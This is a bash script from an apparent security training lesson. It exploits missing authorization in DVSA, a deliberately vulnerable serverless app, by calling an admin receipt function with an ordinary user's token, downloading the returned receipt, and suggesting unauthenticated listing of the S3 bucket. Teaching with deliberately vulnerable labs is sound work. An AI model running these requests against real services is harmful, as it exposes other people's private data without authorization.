#!/bin/bash
# =============================================================================
# Lesson #3: Sensitive Data Exposure — Exploit Script
# DVSA Vulnerability: Receipt files in S3 accessible without proper authorization
# =============================================================================
# Usage: bash lesson03_sensitive_data.sh <API_URL> <TOKEN>
# =============================================================================

set -euo pipefail

API_URL="${1:?Usage: $0 <API_URL> <JWT_TOKEN>}"
TOKEN="${2:?Provide a valid JWT token}"

ORDER_ENDPOINT="${API_URL}/order"

echo "============================================"
echo " Lesson #3: Sensitive Data Exposure"
echo "============================================"
echo ""

# Step 1: List orders to get an order-id
echo "[*] Step 1: Listing user orders..."
ORDERS=$(curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw '{"action":"orders"}')
echo "$ORDERS" | jq .
echo ""

ORDER_ID=$(echo "$ORDERS" | jq -r '.orders[0]["order-id"] // empty' 2>/dev/null || true)
if [[ -z "$ORDER_ID" ]]; then
    echo "[!] No orders found. Place an order first."
    exit 1
fi
echo "[*] Using order-id: ${ORDER_ID}"
echo ""

# Step 2: Try to access the admin receipt function
# The DVSA-ADMIN-GET-RECEIPT function generates pre-signed S3 URLs for receipts
# It should only be accessible to admins, but may lack authorization checks
echo "[*] Step 2: Attempting to access admin receipt function..."
RECEIPT_RESP=$(curl -s "${ORDER_ENDPOINT}" \
  -H "content-type: application/json" \
  -H "authorization: ${TOKEN}" \
  --data-raw "{\"action\":\"get-receipt\",\"order-id\":\"${ORDER_ID}\"}")
echo "$RECEIPT_RESP" | jq .
echo ""

# Step 3: Check if a pre-signed URL was returned
RECEIPT_URL=$(echo "$RECEIPT_RESP" | jq -r '.url // .receipt // .link // empty' 2>/dev/null || true)
if [[ -n "$RECEIPT_URL" ]]; then
    echo "[!] SUCCESS: Got receipt URL without admin privileges!"
    echo "[*] Receipt URL: ${RECEIPT_URL}"
    echo ""
    echo "[*] Step 3: Downloading receipt..."
    curl -s -o /tmp/dvsa_receipt.pdf "${RECEIPT_URL}" && echo "[*] Receipt saved to /tmp/dvsa_receipt.pdf" || echo "[*] Download failed or file format different"
else
    echo "[*] No direct URL in response. Check the response above."
    echo "[*] Also check:"
    echo "    1. S3 bucket for DVSA receipts — it may be publicly accessible"
    echo "    2. Try listing the receipts bucket with AWS CLI"
    echo ""
    echo "[*] Try: aws s3 ls s3://<DVSA_RECEIPTS_BUCKET>/ --no-sign-request"
fi

echo ""
echo "[*] SCREENSHOT REMINDERS:"
echo "    1. Response showing receipt data accessible to non-admin user"
echo "    2. S3 bucket contents (if publicly listable)"
echo "    3. Downloaded receipt or pre-signed URL"
